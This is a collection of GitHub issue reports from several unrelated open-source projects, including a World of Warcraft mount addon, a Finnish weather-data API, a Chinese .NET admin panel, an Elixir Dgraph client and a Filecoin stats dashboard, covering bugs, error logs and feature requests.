Stelle könnte ein Verweis auf erlaubtes Vokabular stehen bzw. auch Vorgaben zum Umgang mit z.B. author keywords
 Ich würde das Format gerne unter https://format.gbv.de/ aufnehmen. Kurzname "vzg-article"? Ich würde das Format gerne unter https://format.gbv.de/ aufnehmen. Kurzname "vzg-article"?
<---------->
160736623
Update the flags in GoGoMount. Leaping Veinseeker is a flying mount.

https://www.wowhead.com/spell=243795/leaping-veinseeker incorrectly shows it as a ground mount.


 The Crusader's Direhorn - the Zandalari Paladin Mount - Has not been added and cannot be used with Gogomount The Crusader's Direhorn - the Zandalari Paladin Mount - Has not been added and cannot be used with Gogomount GoGoMount can't summon the Sylverian Dreamer mount. Recreating issue from curseforge

Keybinding to mount is not working.  Using the same keybind to dismount works just fine, I just can't mount.  

[GoGoMount.txt](https://github.com/tiker/GoGoMount/files/2670436/GoGoMount.txt)

Attaching a new debug file with the latest version installed.

 New mounts need to be added from 8.2. Hi, in Legion I had all class mounts selected as global favourites and my Mage didn't try to mount Pala or Priest mount etc.

However now the character tries to mount a mount it can't, so you have to repeatedly press the key until you "randomly" activate your current class's mount. 

Can you maybe make it so that if a mount is not usable it is removed from the "randomization" algorithm? or maybe even straight up add a class mount option?

Thanks in advance. Hi tiker,

GoGoMount doesn't detect flying (DraenorPathfinder) in the Horde garrison.
This is `GoGo_Variables.Player.MapID == 590` in GoGoZones.lua

Thank you.
 GoGoMount can't summon the Sylverian Dreamer mount. Would it please be possible to enable classic support? I've used this add-on since it came out and while most people do not have so many mounts they need a manager, the ability to auto (un)shapeshift or use aspect of the cheetah for lower characters would be amazing. I updated the addon through the Twitch/Curse application, and as I started the game I was greeted by this error message:

(version v8.1.2)
```
Date: 2018-12-12 20:00:52
ID: 1
Error occured in: Global
Count: 1
Message: ..\AddOns\GoGoMount\GoGoMount.lua line 2950:
   attempt to concatenate field 'CurrentZoneFavorites' (a nil value)
Debug:
   GoGoMount\GoGoMount.lua:2950: GoGo_AddOptionCheckboxes()
   GoGoMount\GoGoMount.lua:2605: GoGo_ZoneFavorites_Panel()
   GoGoMount\GoGoMount.lua:62: GoGo_OnEvent()
   [string "*:OnEvent"]:1:
      [string "*:OnEvent"]:1
Locals:
GoGo_FrameParentText = "GoGo_ZoneFavorites_ContentFrame"
GoGo_Mounts = <table> {
 1 = 580
 2 = 6653
 3 = 6654
 4 = 8395
 5 = 10796
 6 = 10799
 7 = 17462
 8 = 17463
 9 = 17464
 10 = 17465
 11 = 18989
 12 = 18990
 13 = 22718
 14 = 22721
 15 = 22722
 16 = 22724
 17 = 23241
 18 = 23242
 19 = 23243
 20 = 23246
 21 = 23247
 22 = 23248
 23 = 23249
 24 = 23250
 25 = 23251
 26 = 23252
 27 = 23509
 28 = 24242
 29 = 32243
 30 = 32244
 31 = 32245
 32 = 32246
 33 = 32295
 34 = 32296
 35 = 32297
 36 = 33660
 37 = 34790
 38 = 34795
 39 = 34896
 40 = 34897
 41 = 34898
 42 = 34899
 43 = 35018
 44 = 35020
 45 = 35022
 46 = 35025
 47 = 35027
 48 = 35028
 49 = 39315
 50 = 39316
 51 = 39317
 52 = 39318
 53 = 39319
 54 = 40192
 55 = 41518
 56 = 43927
 57 = 55531
 58 = 59569
 59 = 59570
 60 = 59571
 61 = 59788
 62 = 59793
 63 = 59797
 64 = 59961
 65 = 59976
 66 = 60024
 67 = 60025
 68 = 60116
 69 = 60119
 70 = 61230
 71 = 61309
 72 = 61447
 73 = 61451
 74 = 61997
 75 = 64657
 76 = 64658
 77 = 64977
 78 = 65639
 79 = 65641
 80 = 65644
 81 = 65645
 82 = 65646
 83 = 66846
 84 = 72807
 85 = 87090
 86 = 87091
 87 = 88748
 88 = 88749
 89 = 88990
 90 = 93644
 91 = 102349
 92 = 103081
 93 = 113199
 94 = 118089
 95 = 120395
 96 = 121836
 97 = 121837
 98 = 121838
 99 = 121839
 100 = 122708
 101 = 123992
 102 = 123993
 103 = 124408
 104 = 127216
 105 = 127220
 106 = 127286
 107 = 127287
 108 = 127288
 109 = 127289
 110 = 127290
 111 = 130086
 112 = 130137
 113 = 130138
 114 = 133023
 115 = 142073
 116 = 171616
 117 = 171622
 118 = 171624
 119 = 171628
 120 = 171633
 121 = 171826
 122 = 171830
 123 = 171837
 124 = 171839
 125 = 171850
 126 = 171851
 127 = 179244
 128 = 183117
 129 = 189364
 130 = 189999
 131 = 190977
 132 = 191633
 133 = 194464
 134 = 213158
 135 = 213164
 136 = 213163
 137 = 213165
 138 = 222202
 139 = 222238
 140 = 227956
 141 = 229377
 142 = 230401
 143 = 230987
 144 = 231428
 145 = 232405
 146 = 242875
 147 = 245725
 148 = 253662
 149 = 253660
 150 = 258060
 151 = 258845
}
GoGo_MountCount = 151
_G = <table> {
 UpdateOnBarHighlightMarksBySpell = <function> defined @Interface\FrameXML\ActionButton.lua:74
 ERR_OUT_OF_CHI = "Not enough chi"
 DH_HAVOC_CORE_ABILITY_2 = "Strong melee attack that consumes Fury. If it critical strikes, some Fury is refunded."
 MultiCastActionButton6Cooldown = MultiCastActionButton6Cooldown {
 }
 MerchantItem9ItemButtonStock = MerchantItem9ItemButtonStock {
 }
 GetTrainerServiceTypeFilter = <function> defined =[C]:-1
 UNIT_NAMES_COMBATLOG_TOOLTIP = "Color unit names."
 SetTrainerServiceTypeFilter = <function> defined =[C]:-1
 StoreMicroButtonAlertGlowBottom = StoreMicroButtonAlertGlowBottom {
 }
 SPELL_FAILED_CUSTOM_ERROR_71 = "This partygoer wants to dance with you."
 LE_GAME_ERR_PET_SPELL_TARGETS_DEAD = 398
 ERROR_CLUB_TICKET_COUNT_AT_MAX_COMMUNITY = "Can't create any more invite links for this community."
 RecruitAFriendFrame = RecruitAFriendFrame {
 }
 CompactUnitFrameProfilesGeneralOptionsFrameHealthTextDropdownButtonNormalTexture = CompactUnitFrameProfilesGeneralOptionsFrameHealthTextDropdownButtonNormalTexture {
 }
 TutorialFrameLeft19 = TutorialFrameLeft19 {
 }
 MultiCastActionButton2Cooldown = MultiCastActionButton2Cooldown {
 }
 ERR_TRADE_EQUIPPED_BAG = "You can't trade equipped bags."
 PVP_RANK_6_1 = "Corporal"
 BOOKTYPE_PROFESSION = "professions"
 AudioOptionsVoicePanelOutputDeviceDropdownButtonHighlightTexture = AudioOptionsVoicePanelOutputDeviceDropdownButtonHighlightTexture {
 }
 VideoOptionsFrameDefaults = VideoOptionsFrameDefaults {
 }
 MerchantItem1AltCurrencyFrameItem1Text = MerchantItem1AltCurrencyFrameItem1Text {
 }
 OPTION_TOOLTIP_ACTION_BUTTON_USE_KEY_DOWN = "Action button keybinds will respond on key down, rather than on key up."
 BINDING_NAME_NAMEPLATES = "Show Enemy Name Plates"
 INSTANCE_UNAVAILABLE_OTHER_TEMPORARILY_DISABLED = "%s cannot enter. This instance is temporarily disabled."
 EncounterDetails_SpellAurasScrollScrollChildFrame = EncounterDetails_SpellAurasScrollScrollChildFrame {
 }
 MultiBarBottomRightButton8Shine5 = MultiBarBottomRightButton8Shine5 {
 }
 IsReferAFriendLinke
AddOns:
  Swatter, v8.0.6162 (SwimmingSeadragon)
  AdiBags, vv1.9.11
  AucAdvanced, v8.0.6122 (SwimmingSeadragon)
  AucFilterBasic, v8.0.6149 (SwimmingSeadragon)
  AucStatHistogram, v8.0.6151 (SwimmingSeadragon)
  AucStatiLevel, v8.0.6155 (SwimmingSeadragon)
  AucStatPurchased, v8.0.6152 (SwimmingSeadragon)
  AucStatSimple, v8.0.6153 (SwimmingSeadragon)
  AucStatStdDev, v8.0.6154 (SwimmingSeadragon)
  AucUtilFixAH, v8.0.6156 (SwimmingSeadragon)
  BeanCounter, v8.0.6157 (SwimmingSeadragon)
  Clique, vv80000-1.0.0
  DBMCore, v8.0.17
  DBMDefaultSkin, v
  DBMStatusBarTimers, v
  Details, v
  DetailsDmgRank, v
  DetailsDpsTuning, v
  DetailsEncounterDetails, v
  DetailsRaidCheck, v
  DetailsStreamer, v
  DetailsTimeAttack, v
  DetailsTinyThreat, v
  DetailsVanguard, v
  DialogKey, v1.5.3
  ElvUI, v10.84
  ElvUISLE, v3.482
  GoGoMount, v8.0.11
  SlideBar, v8.0.6160 (SwimmingSeadragon)
  Stubby, v8.0.6161 (SwimmingSeadragon)
  BlizRuntimeLib_enUS v8.1.0.80000 <none>
  (ck=3c7)
``` To do:
Add the new 8.2 zone(s)
Add detection and checks for all of the BfA zones
 when you unlock pathfinder part two and flying but when you use the marco it well still summon ground mounts. so you have to go thought 3-7 mounts before you get a flying mount. so addon has become useless. when you unlock pathfinder part two and flying but when you use the marco it well still summon ground mounts. so you have to go thought 3-7 mounts before you get a flying mount. so addon has become useless.
<---------->
161476343
Start using the mechanism for referring to well-known response schemas (https://github.com/vaisala-oss/sofp-core/issues/4) as soon as the core supports it. An enum would make parameter selection a lot easier and less error-prone for the clients. The server (backend) should probably silently allow also non-listed properties to be used.

Example: https://gist.github.com/ilkkarinne/c7217c03198865d0efc5c551f975b612#file-api-json-L182    The following query parameters should probably not be listed any of the collections/*/items:
* observationType (no point in filtering by the type, always "MeasureObservation" or "MeasureTimeseriesObservation" depending on the collection)
* phenomenonTime (the "time" parameter should probably do the same thing as this)
* result (unless we really are able to do filtering by result value)
* resultTime (probably not relevant for most customers) Currently the response schemas for timeseries and non-timeseries collection are identical:

```json
"hirlamFeatureGeoJSON": {
        "type": "object",
        "required": [
          "type",
          "geometry",
          "properties"
        ],
        "properties": {
          "type": {
            "type": "string",
            "enum": [
              "Feature"
            ]
          },
          "geometry": {
            "$ref": "#/components/schemas/geometryGeoJSON"
          },
          "properties": {
            "type": "object",
            "properties": {
              "observationType": {
                "type": "string"
              },
              "id": {
                "type": "string"
              },
              "time": {
                "type": "string"
              },
              "phenomenonTime": {
                "type": "string"
              },
              "observedPropertyName": {
                "type": "string"
              },
              "result": {
                "type": "number"
              },
              "resultTime": {
                "type": "string"
              },
              "place": {
                "type": "string"
              },
              "latlon": {
                "type": "string"
              },
              "lonlat": {
                "type": "string"
              }
            }
          },
          "id": {
            "oneOf": [
              {
                "type": "string"
              },
              {
                "type": "integer"
              }
            ]
          }
        }
      },
```

```json
"hirlam_timeseriesFeatureGeoJSON": {
        "type": "object",
        "required": [
          "type",
          "geometry",
          "properties"
        ],
        "properties": {
          "type": {
            "type": "string",
            "enum": [
              "Feature"
            ]
          },
          "geometry": {
            "$ref": "#/components/schemas/geometryGeoJSON"
          },
          "properties": {
            "type": "object",
            "properties": {
              "observationType": {
                "type": "string"
              },
              "id": {
                "type": "string"
              },
              "time": {
                "type": "string"
              },
              "phenomenonTime": {
                "type": "string"
              },
              "observedPropertyName": {
                "type": "string"
              },
              "result": {
                "type": "number"
              },
              "resultTime": {
                "type": "string"
              },
              "place": {
                "type": "string"
              },
              "latlon": {
                "type": "string"
              },
              "lonlat": {
                "type": "string"
              }
            }
          },
          "id": {
            "oneOf": [
              {
                "type": "string"
              },
              {
                "type": "integer"
              }
            ]
          }
        }
      },
```

The non-timeseries collections should refer the OMSF MeasureObservation schema: https://gist.github.com/ilkkarinne/c7217c03198865d0efc5c551f975b612#file-api-json-L248

The timeseries colellections on the other hand to MeasureTimeseriesObservation schema: https://gist.github.com/ilkkarinne/c7217c03198865d0efc5c551f975b612#file-api-json-L449 The following properties should not be included in the response features as they are not included in the OMSF Observation feature types:
* place
* latlon
* lonlat

It's ok to still have these as query parameters. The ID fields of the returned features should be globally unique and permanent. Currently the following type of IDs are used:
```json
"id": "BsWfsElement.1.4.4",
```

Ideally the feature ids generated should also be applicable to "get feature by id" requests (/collections/*/items/{featureId}), thus a good approach would be similar to the one used for the FMI WFS 2 service (a hash generated from the response):
```xml
<omso:GridSeriesObservation gml:id="WFS-5jvDCNXIvirZwGs_djE1of80RfaJTowuYWbbpdOs2_llx4efR060aeWzDtdOufXlmw48rp1w36d3R0629dnTTw36d3THv7ZeWHPlhaWLLn07qmnbltR_wpUzZxXCY2PlzrUi0Kcd06aMmrhnZd2Spp25bUf8KVQ2ZQnBm07sk7Lh5ZefSth2ackhmZ8u_Tk51mNmrhkyaujXl899_LJf39svLvy09MOLZliaWzL2y7KnnhlqZmzfjw7MtambTfjSV3XpmcNbbh8RNPPph3Y8tK1dCA1tunnz07s9TL46VjTsM5lbd.TLsrM0aeWzDtZXDDyw7a1I.XfwkZdOfR0rWqZdvDLyw9OvLLWhQ5ZefPryy1oSOu3Tk09PNbVfTuyRNPLLj6ad.6tavp3ZKfDLlyTadZ1fTuyVZtOs6vp3ZK02nWtNw.NO3rtr6d2StCvp3ZI_Xn0rQiZe9Dfp3dK3qm_ph2Q9m_rkh7.2XlW5Xy4emjLyp.duLfsZ1tTN_eHs39ckPf2y8q4JuXJp67Yezf1yQ9_bLyrckac.iHs39ckPf2y8q3qHLLj08NPTD0079zHRXNQ5Zcenhp6Yemnfug7d_Xd0r2pYcmnD00790fZvxYdkHHj67euzD00791d1LDk04emnfumV4OPH129dmHpp37qwwqWHJpw9NO_dOy9KfXlmw48syvBx4.u3rsw9NO_dWGFSw5NOHpp37p2XpT68s2HHlp14OPH129dmHpp37q.KWHJpw9NO_dE05s3Xnlg48fXb12YemnfurWmYd2SnlwzcPPW3OfTfyy5OPXLy839OSvMLNt0unWbfyy48PPo6daNPLZh2unXPryzYceV064b9O7o6dbeuzpp4b9O7pj39svLDnytDpp25afTLwn5CaHTTty2t.7LWNVqQwA--">
```
Alternatively the hash could be generated from the query parameters only, but this might return a different feature when executed at later time. Copied over from https://github.com/vaisala-oss/sofp-core/issues/5 by @bosborn:

Was testing against your demo server and noticed some invalid geometry points.

http://beta.fmi.fi/data/3/wfs/sofp/collections/opendata_1h/items?time=20190519T140000/20190619T140000&bbox=20.0,60.0,22.0,62.0&limit=15&f=json

Produces points like:

```
"geometry": {
    "type": "Point",
    "coordinates": [
        "[21.69828 20.74698 21.02681 21.30273 21.78320 21.37592 21.51533 20.29765]",
        "[60.1116 60.2582 60.7222 61.1447 61.4789 61.6304 61.1366 60.1158]"
    ]
}
```
 Times are in the wrong fields in observations:

For example:
http://beta.fmi.fi/data/3/wfs/sofp/collections/opendata_1m/items?time=2018-02-26T08:00:00Z/2018-02-26T09:00:00Z&place=kaisaniemi

Returns: 
```
observationType:  "MeasureObservation"
resultTime: "20180226T080000"
phenomenonTime:  "20190226T075143"
id: "BsWfsElement.1.1.9"
observedPropertyName: "Precipitation1h"
```
phenomenonTime should be 20180226T080000. I assume that resultTime _should_ be time when the observation has been available (@ilkkarinne ?). Unfortunately we do not have that information available and we need to use observation time instead.

 Copied over from https://github.com/vaisala-oss/sofp-core/issues/5 by @bosborn:

Was testing against your demo server and noticed some invalid geometry points.

http://beta.fmi.fi/data/3/wfs/sofp/collections/opendata_1h/items?time=20190519T140000/20190619T140000&bbox=20.0,60.0,22.0,62.0&limit=15&f=json

Produces points like:

"geometry": {
    "type": "Point",
    "coordinates": [
        "[21.69828 20.74698 21.02681 21.30273 21.78320 21.37592 21.51533 20.29765]",
        "[60.1116 60.2582 60.7222 61.1447 61.4789 61.6304 61.1366 60.1158]"
    ]
}
 The items in the WFS3 collections should be using the OMSF JSON format as described in https://github.com/opengeospatial/omsf-profile/tree/master/omsf-json All properties can not be used as filters. For example:

Specification says: 
> If features in the feature collection include a feature property that has a simple value (for example, a string or integer) that is expected to be useful for applications using the service to filter the features of the collection based on this property, you SHOULD support a parameter with the name of the feature property and with the following characteristics (using an OpenAPI Specification 3.0 fragment):
> in: query
> required: false
> style: form
> explode: false
> The schema property SHOULD be the same as the definition of the feature property in the response schema.

For example query:
http://beta.fmi.fi/data/3/wfs/sofp/collections/hirlam/items?limit=100&place=kaisaniemi&observedPropertyName=WindSpeedMS&phenomenonTime=20190225T080001
Should NOT return anything.

 This query should return only Helsinki data? Now it returns 'grid-data' after Helsinki-data: http://beta.fmi.fi/data/3/wfs/sofp/collections/harmonie_scandinavia_surface/items?parametername=temperature,windspeedms&time=2019-01-31T10:00:00/2019-01-31T13:00:00&bbox=35,65,36,66&place=helsinki
 The following properties should not be included in the response features as they are not included in the OMSF Observation feature types:
* place
* latlon
* lonlat

It's ok to still have these as query parameters. All properties can not be used as filters. For example:

Specification says: 
> If features in the feature collection include a feature property that has a simple value (for example, a string or integer) that is expected to be useful for applications using the service to filter the features of the collection based on this property, you SHOULD support a parameter with the name of the feature property and with the following characteristics (using an OpenAPI Specification 3.0 fragment):
> in: query
> required: false
> style: form
> explode: false
> The schema property SHOULD be the same as the definition of the feature property in the response schema.

For example query:
http://beta.fmi.fi/data/3/wfs/sofp/collections/hirlam/items?limit=100&place=kaisaniemi&observedPropertyName=WindSpeedMS&phenomenonTime=20190225T080001
Should NOT return anything.

 Times are in the wrong fields in observations:

For example:
http://beta.fmi.fi/data/3/wfs/sofp/collections/opendata_1m/items?time=2018-02-26T08:00:00Z/2018-02-26T09:00:00Z&place=kaisaniemi

Returns: 
```
observationType:  "MeasureObservation"
resultTime: "20180226T080000"
phenomenonTime:  "20190226T075143"
id: "BsWfsElement.1.1.9"
observedPropertyName: "Precipitation1h"
```
phenomenonTime should be 20180226T080000. I assume that resultTime _should_ be time when the observation has been available (@ilkkarinne ?). Unfortunately we do not have that information available and we need to use observation time instead.

 Current implementation add ```nan``` values to observation stations which do not provide data for queried parameters nor time range. Is it better to add missing values or filter those points out from the response totally?

The first implicates that client need to handle missing values somehow. The latter means that client can't trust that all requested locations exist in the response. 
 This query should return only Helsinki data? Now it returns 'grid-data' after Helsinki-data: http://beta.fmi.fi/data/3/wfs/sofp/collections/harmonie_scandinavia_surface/items?parametername=temperature,windspeedms&time=2019-01-31T10:00:00/2019-01-31T13:00:00&bbox=35,65,36,66&place=helsinki
 Current implementation add ```nan``` values to observation stations which do not provide data for queried parameters nor time range. Is it better to add missing values or filter those points out from the response totally?

The first implicates that client need to handle missing values somehow. The latter means that client can't trust that all requested locations exist in the response. 

<---------->
161908197
当打开图标管理报：
网络出错，请检查你的网络或者服务是否可用
请求地址：[http://localhost:54321/api/v1/rbac/icon/list] RT. 不同用户登录看到数据表格可以设置 像勾选按扭功能一样
不同用户可以根据配置的属性与策略对数据进行筛选显示 1).用户退出登录后重新登录;2).用户退出登录后切换用户登录
以上这两种情况下标签页仍然保持上一用户登录时的打开状态 Token过期后没有自动刷新？  ERROR  Failed to compile with 1 errors                                                                                     9:03:36 PM
 error  in ./src/index.less

Module build failed (from ./node_modules/mini-css-extract-plugin/dist/loader.js):
ModuleNotFoundError: Module not found: Error: Can't resolve './fonts/ionicons.svg?v=3.0.0' in 'E:\Work\C#\Demo\DncZeus\DncZeus.App\src' 示例菜单设置在顶级菜单下，示例页面设置在示例菜单下。但是在运行后，示例页面直接显示在主菜单的一级菜单，没有二级菜单。
打开示例页面后，地址显示是对的“示例菜单/示例页面”。 ![image](https://user-images.githubusercontent.com/34881771/61860056-e267f980-aefb-11e9-9ac3-9d56c10adcaa.png)
![image](https://user-images.githubusercontent.com/34881771/61860072-e8f67100-aefb-11e9-94d2-edb62f80f800.png)
 前端在跳转时一直报
Error: Cannot find module './viewMain'
    at eval (eval at ./src lazy recursive ^\.\/view.*$ (app.js:3777), <anonymous>:327:12)

 RT.

指定编译模式为 `Release` 后,访问 `/swagger` 会出现如下错误信息:

``` json
{
  "statusCode": 500,
  "message": "资源服务器忙,请稍候再试,原因:Could not find file '...yourpath\\DncZeus\\DncZeus.Api\\bin\\Release\\netcoreapp2.1\\DncZeus.Api.xml'."
}
``` namespace DncZeus.Api.Extensions.CustomException

public class CustomAuthorizeAttribute

public void OnAuthorization(AuthorizationFilterContext context)
        {
            return;
            // 以下权限拦截器未现实，所以直接return
            var user = context.HttpContext.User; RT.

``` json
// 现有配置为
baseUrl: {
    dev: 'http://localhost:54321/api/v1/',
    pro: 'http://localhost:54321/api/v1/'
  }
```
这里的 `/api/v1` 不具备共性,不应该放到 `baseUrl` 里,

举些栗子:

- 新增的 api 不以 `api/v1` 为前缀的怎么办?另写一个 axios 的封装,明显不合理
- 有些接口发布后是api直接用二级域名 `http://api.some.com`,这个时候 `baseUrl=http://api.some.com/api/v1`,看着就不有爱...
- ...
- 总而言之...`/api/v1`不应该放到 `baseUrl` 里

iview-admin 本身给的例子也是真正具备共性的 [baseUrl](https://github.com/iview/iview-admin/blob/master/src/config/index.js)


 添加三级菜单，路径正确，无法访问，改成二级菜单后正常 如何设置将前端首页背景图片显示的正常一些，支持原像素显示？ RT.

现版本用户登录后,没有一个明显的用户识别,很难看出来登录的是哪个用户,建议在如下位置加个用户名啥的,以便查看.

![default](https://user-images.githubusercontent.com/16029681/52830369-7fcc2f80-310b-11e9-893c-407fd1bf381d.png)
 菜單管理，新增菜單時沒有選擇圖標，仍可存入DB，但不會顯示在list無法編輯 输出显示Found operation objects with duplicate operationId 'Edit'.  OperationId must be unique among all operations described in the API. 似乎OperationId重复了 菜單管理，新增菜單時沒有選擇圖標，仍可存入DB，但不會顯示在list無法編輯  RT.

没有一个有效使用的例子, 现有的页面排序都是前端排序.
<---------->
161956402
I get an annoying `** (CaseClauseError) no case clause matching: {:error, {:stream_error, :internal_error, :"Stream reset by server."}}` periodically when I'm on shell. Is Dgraph rejecting pings for some reason?   Repo.get!("0x7") `<- this uid exists in db, connection info is passed through repo.ex`

throws following error:
```** (ArgumentError) raise/1 and reraise/2 expect a module name, string or exception as the first argument, got: {:untyped, %{"courses.description" => "testing the course", "courses.duration_units" => 3, "courses.title" => "Refresher Course", "dgraph.type" => ["type.courses"], "uid" => "0x7"}}```

It works fine with this [commit](https://github.com/liveforeverx/dlex/tree/b8e8b84af8d19c61b2369dd5dacc53e226887ba5) Hi,

This is a request for supporting associations and resolvers. Something like following:

```
defmodule Person do
  use Dlex.Node
  @derive {Phoenix.Param, key: :uid}

  import Ecto.Changeset

  schema "persons" do
    field :name,      :string
    field :age,       :integer
    field :works_at,  :uid, model: Company
    field :company_count, :integer, virtual: true, resolve: "count(works_at)"
  end

  ...
```

Thanks,
Gorav Dlex.get!("0x7") `<- this uid exists in db`

throws following error:
```** (ArgumentError) raise/1 and reraise/2 expect a module name, string or exception as the first argument, got: {:untyped, %{"courses.description" => "testing the course", "courses.duration_units" => 3, "courses.title" => "Refresher Course", "dgraph.type" => ["type.courses"], "uid" => "0x7"}}```

It works fine with this [commit](https://github.com/liveforeverx/dlex/tree/b8e8b84af8d19c61b2369dd5dacc53e226887ba5) Hi @liveforeverx,

Thank you for the fantastic library and amazing implementation of Dlex.Node. I am working on developing a LMS prototype - my first attempt at using a Graph database. I had to dig into the code files to understand the implementation. I intend to add documentation and may be a sample repo for anybody else wanting to use the library. I have done the following:

[x] Implemented a Grepo module similar to Repo.ex for making calls to Dgraph. I may be using postgres in the project as well and hence, retained Repo for the purpose.
[x] added Grepo to supervision tree.
[x] implemented a the model (Course.ex) using Dlex.Node and the context (Courses.ex).
[x] got CRUD action to work with a html view.
[ ] i18n feature in model - this is where I need help at the moment.

```
defmodule Lms.Courses.Course do
  use Dlex.Node
  @derive {Phoenix.Param, key: :uid}

  import Ecto.Changeset

  schema "courses" do
    field(:title, :string, index: ["term"])
    field(:description, :string)
    field(:duration_allowed, :integer)
   ...
```
how do I use title@en or other locales in this context?

Best,
Gorav Hi!

How can I use the conditional upsert functionality, similar to this https://github.com/dgraph-io/pydgraph#running-a-conditional-upsert

I can contribute if you give me some guidelines. Hi!

How can I use the conditional upsert functionality, similar to this https://github.com/dgraph-io/pydgraph#running-a-conditional-upsert

I can contribute if you give me some guidelines. I'm trying to achieve an upsert, also modifying the node, and always returning the uid. The upsert criteria is just an eq lookup on a field, no logic involved. What would be the best way to achive this?

The [dgraph docs](https://docs.dgraph.io/howto/#upserts) mention two ways to do upserts:
1. Using a transaction - this would naturally cause another request round trip but that's ok
2. Using an upsert block - this doesn't return the uid if the node already existed, at least in Ratel, but I could query for the uid right after the upsert

I tried both approaches with dlex, but feel that the documentation plus looking at the code doesn't give me enough knowledge to achieve this.

Here's what I tried:
```
id = "user1"
statement =
  ~s"""
  upsert {
    query {
      v as var(func: eq(id, "#{id}"))
    }

    mutation {
      set {
        uid(v) <id> "#{id}" .
      }
    }
  }
  """
Dlex.mutate!(conn, statement)
```

grpc gave me a parsing error:
```
while lexing upsert { at line 1 column 0: Unexpected char 'p' when parsing uid keyword
```

Then, I tried it with HTTP, which gave me a different parsing error:
```
at line 1 column 7: Invalid character '{' inside mutation text
```

I also tried using a transaction, but got:
```
StartTs cannot be zero while committing a transaction
```


I'm happy to help with an PR to extend it once this is solved :)

Thanks for your great work! Cheers Thanks for releasing this library!

Just looking for a little clarification, and forgive me because I've been using Elixir for ~6 months.

Is there a way to `Dlex.start_link` in one location and then get the `pid` anywhere it's needed through the app? Or is the recommended approach to use `Dlex.start_link` in each function where queries/mutation are needed?

For example, I tried doing this in my application.ex:
```
def start(_type, _args) do
    children = [
      # ...
      {Dlex, [name: :dlex]},
    ]
```
And then doing
`{:ok, result} = Dlex.query(:dlex, query)` in other modules, but that produces a bunch of Run time errors. 

I did see that the tests do something to this effect by using `setup` and passing in the pid/(conn) to each test, but I'm wanting know if this can be done for the whole application across multiple contexts.

Thanks again!
 Thanks for releasing this library!

Just looking for a little clarification, and forgive me because I've been using Elixir for ~6 months.

Is there a way to `Dlex.start_link` in one location and then get the `pid` anywhere it's needed through the app? Or is the recommended approach to use `Dlex.start_link` in each function where queries/mutation are needed?

For example, I tried doing this in my application.ex:
```
def start(_type, _args) do
    children = [
      # ...
      {Dlex, [name: :dlex]},
    ]
```
And then doing
`{:ok, result} = Dlex.query(:dlex, query)` in other modules, but that produces a bunch of Run time errors. 

I did see that the tests do something to this effect by using `setup` and passing in the pid/(conn) to each test, but I'm wanting know if this can be done for the whole application across multiple contexts.

Thanks again!
 Hi!

I'm trying to use this library on my local DGraph install, but I'm getting some errors. I replicated the `TestRepo` structure you have in the tests, and I also tried using the methods in the readme (without any repo) and I get the same error with both methods when trying to add data to my DB:

```elixir
user = %Myapp.User{name: "Alice", age: 25}
MyApp.TestRepo.set(user)
{:error,
 %Dlex.Error{
   action: :execute,
   reason: %GRPC.RPCError{
     message: "unknown method Mutate for service api.Dgraph",
     status: 12
   }
 }
}
```

Any idea of what might be happening here?

Thanks! Hi!

I'm trying to use this library on my local DGraph install, but I'm getting some errors. I replicated the `TestRepo` structure you have in the tests, and I also tried using the methods in the readme (without any repo) and I get the same error with both methods when trying to add data to my DB:

```elixir
{:ok, pid} = MyApp.TestRepo.start_link
user = %Myapp.User{name: "Alice", age: 25}
MyApp.TestRepo.set(user)
{:error,
 %Dlex.Error{
   action: :execute,
   reason: %GRPC.RPCError{
     message: "unknown method Mutate for service api.Dgraph",
     status: 12
   }
 }
}
```

Any idea of what might be happening here?

Thanks!

Edit: I'm using version 0.2.1 of this library. I get an annoying `** (CaseClauseError) no case clause matching: {:error, {:stream_error, :internal_error, :"Stream reset by server."}}` periodically when I'm on shell. Is Dgraph rejecting pings for some reason?  
<---------->
162030032
I want to download this dot song!. Where can I download that?
<---------->
162078538
This is a placeholder issue for necessary updates due to changes to block datastructure in https://github.com/filecoin-project/go-filecoin/pull/3185. Just an FYI - from a fresh checkout I was getting the compile error below because there are 2 conflicting declarations of `declare var process`, one from `node_modules/@types/node` and one from `frontend/types/index.d.ts`. 

Commented out the one in `node_modules/@types/node/globals.d.ts` and the error goes away. Compiles fine now.

```
Failed to compile.

[at-loader] ./node_modules/@types/node/globals.d.ts:162:13 
    TS2403: Subsequent variable declarations must have the same type.  Variable 'process' must be of type '{ env: { BACKEND_URL: string; SENTRY_DSN?: string; GA_TRACKING_ID?: string; }; }', but here has type 'Process'.
```

```
> npm ls @types/node
filecoin-network-stats/frontend
└─┬ webpack-dev-server@3.5.0
  └─┬ del@4.1.1
    └─┬ @types/glob@7.1.1
      └── @types/node@12.0.4
``` @zhengboowen commented on [Wed May 29 2019](https://github.com/filecoin-project/go-filecoin/issues/2849)

The mining data on Filecoin devnet seems to have a problem. These data are displayed two days ago. Did the network not update the blockchain data in time? Or is there a problem with the blockchain data ?

![20190529 web data](https://user-images.githubusercontent.com/51158073/58550629-c1a75e80-8240-11e9-88c0-3c422bf3c309.jpeg)


 @zhengboowen commented on [Wed May 29 2019](https://github.com/filecoin-project/go-filecoin/issues/2849)

The mining data on Filecoin devnet seems to have a problem. These data are displayed two days ago. Did the network not update the blockchain data in time? Or is there a problem with the blockchain data ?

![20190529 web data](https://user-images.githubusercontent.com/51158073/58550629-c1a75e80-8240-11e9-88c0-3c422bf3c309.jpeg)


 Just an FYI - from a fresh checkout I was getting the compile error below because there are 2 conflicting declarations of `declare var process`, one from `node_modules/@types/node` and one from `frontend/types/index.d.ts`. 

Commented out the one in `node_modules/@types/node/globals.d.ts` and the error goes away. Compiles fine now.

```
Failed to compile.

[at-loader] ./node_modules/@types/node/globals.d.ts:162:13 
    TS2403: Subsequent variable declarations must have the same type.  Variable 'process' must be of type '{ env: { BACKEND_URL: string; SENTRY_DSN?: string; GA_TRACKING_ID?: string; }; }', but here has type 'Process'.
```

Typescript v3.5.1
Node version v11.13.0 Currently the dashboard counts *any* node that connects to it, regardless of network or version. The result is an misleading count of participating nodes.

Let’s add genesisCID to the heartbeat messages. Then the stats dashboard could reject connections from nodes that are no longer on the correct network.

Based on chat discussion w/ @mslipper @frrist.  - db-migrate up  failed
```
$ DATABASE_URL=postgres://postgres:xxx@1@localhost:5432/filecoin-network-stats db-migrate   up

received data: CREATE INDEX block_height_idx ON blocks USING btree(height);
[INFO] Processed migration 20190606073105-add-block-height-index
[ERROR] AssertionError [ERR_ASSERTION]: ifError got unwanted exception: ENOENT: no such file or directory, open '/home/filecoin/codes/filecoin-network-stats/backend/migrations/sqls/20190608002923-update-trigger-param-type-up.sql'
